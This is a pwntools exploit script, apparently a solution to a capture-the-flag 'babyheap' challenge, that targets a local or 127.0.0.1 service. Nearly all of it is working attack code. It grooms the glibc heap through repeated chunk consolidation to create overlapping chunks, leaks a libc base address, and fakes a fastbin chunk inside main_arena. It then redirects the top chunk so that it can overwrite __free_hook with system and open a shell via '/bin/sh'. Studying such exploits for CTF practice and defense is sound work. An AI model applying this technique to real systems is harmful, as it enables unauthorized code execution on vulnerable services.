#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 3000
from pwn import *

# Set up pwntools for the correct architecture
exe = './babyheap'
context.terminal = ['tmux', 'new-window']
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 3000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] +argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

chunks = [False]*0x10
def allocate(size):
    index = -1
    for i in range(len(chunks)):
        if not chunks[i]:
            chunks[i] = True
            index = i
            break

    if index < 0:
        return -1

    io.sendlineafter(": ", "1")
    io.sendlineafter(": ", f"{size}")

    return index

def update(index, data):
    io.sendlineafter(": ", "2")
    io.sendlineafter(": ", f"{index}")
    io.sendlineafter(": ", f"{len(data)}")
    io.sendafter(": ", data)

def delete(index):
    if not chunks[index]:
        return

    chunks[index] = False
    io.sendlineafter(": ", "3")
    io.sendlineafter(": ", f"{index}")

def view(index):
    io.sendlineafter(": ", "4")
    io.sendlineafter(": ", f"{index}")
    io.recvuntil(":")
    return io.recvline()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

# 0xf 0x58
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start(env=env)

for i in range(16):
  allocate(0x48)
  update(i, "\x00"*0x48)

for i in range(14):
  delete(i)

for i in range(14):
  allocate(0x28)
  update(i, "\x00"*0x28)

for i in range(1, 12, 2):
  delete(i)

#first consolidate
allocate(0x38)

#overwrite unsorted bin size to 0x100
update(1, "A"*0x38)

#empty unsorted bin
allocate(0x48) #3
allocate(0x48) #5
allocate(0x58) #7

#chunk to be consolidated
delete(3)

#fill 0x30 tcache
delete(8)

#chunk to fulfill second consolidate
delete(10)

# second consolidate
# consolidate will take 0x30 fastbin return it,
# and put 0x50 fastbin in smallbin
la = allocate(0x18) #3
update(la, "d"*0x10)

#chunk with prev size 0x1f0
delete(14)

# third consolidate
# will give us overlapping chunks
# chunk returned to allocate is the one that
# was in the smallbin before third consolidate.
# => #5 now is overlapping with unsorted bin
allocate(0x58) #8

# #8 == #5 + 0x10
leak = view(5).replace(b' ',b'')[16:24]
leak = u64(leak)

#libc.address = leak - 0x1e4ca0
libc.address = leak - 0x3b2ca0
free_hook = libc.sym['__free_hook']

print(f"Libc base: {hex(libc.address)}")
print(f"Free hook: {hex(free_hook)}")

# fix size of chunk #5, which has been
# overwritten to 0 by alloc of #8
# (free(): invalid pointer)
payload = b"\x00"*0x48
payload += p64(0x51)
update(8, payload)

# fix next chunk size in order to free #5 
# (free(): invalid next size (fast))
allocate(0x58) #9
payload = b"\x00"*0x30
payload += p64(0x0)
payload += p64(0x51)
update(9, payload)

delete(5)

# odd offset to main_arena in order to fake
# fastbin size and allocate chunk in main_arena
# size is faked based on chunk allocated below
# works because heap addresses start with 0x55
payload = b"\x00"*0x48
payload += p64(0x51)
payload += p64(libc.sym['main_arena'] + 21)
update(8, payload)

delete(8)

# chunk we will use to fake size
allocate(0x28) #5
delete(5)

# empty 0x50 fastbin
allocate(0x48) # 7

# get chunk in main_arena
allocate(0x48) # 8

new_top = free_hook - 0xb58
print(f"new top: {hex(new_top)}")

# update top chunk
payload = b"\x00"*3
payload += p64(0)*7
payload += p64(new_top)
update(8, payload)

# fill 0x60 tcache
for i in range(0x6):
    _id = allocate(0x58)
    delete(_id)

# allocate, free, clear fastbin
# until we get a chunk @free_hook
a = allocate(0x58)
for i in range(0xd):
    b = allocate(0x58)
    delete(a)

    payload = b"\x00"*2
    payload += p64(0)*7
    update(8, payload) 

    a = allocate(0x58)
    delete(b)

    payload = b"\x00"*2
    payload += p64(0)*7
    update(8, payload) 

sh = allocate(0x28)

#free_hook chunk
hax = allocate(0x58)

update(sh, "/bin/sh")
update(hax, p64(0)+p64(libc.sym['system']))

print("Triggering shell")
delete(sh)

io.interactive()

